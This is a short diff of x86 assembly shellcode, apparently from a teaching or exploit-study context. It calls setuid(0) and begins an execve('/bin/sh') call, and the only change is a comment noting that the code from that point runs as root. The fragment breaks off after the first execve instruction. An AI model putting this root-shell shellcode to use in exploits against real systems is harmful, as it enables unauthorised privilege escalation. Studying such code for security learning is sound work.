@@ -6,7 +6,7 @@ _start:
     xor    %eax, %eax
     xor    %ebx, %ebx
     mov    $23, %al
-    int    $0x80
+    int    $0x80        # all instructions after this point run as UID = 0 (root)
 
     # execve("/bin/sh", NULL, NULL)
     xor    %eax, %eax
